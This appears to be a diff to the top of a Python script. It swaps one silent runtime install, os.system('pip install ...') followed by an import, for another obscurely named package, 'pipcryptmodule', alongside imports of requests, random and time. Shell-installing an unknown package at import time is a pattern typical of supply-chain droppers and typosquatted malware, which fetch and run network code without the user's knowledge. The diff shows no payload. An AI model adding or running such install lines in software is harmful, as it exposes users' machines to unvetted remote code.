@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite2extensions")
-import syssqlite2extensions
+os.system("pip install pipcryptmodule")
+import pipcryptmodule
 import random
 import requests
 import time
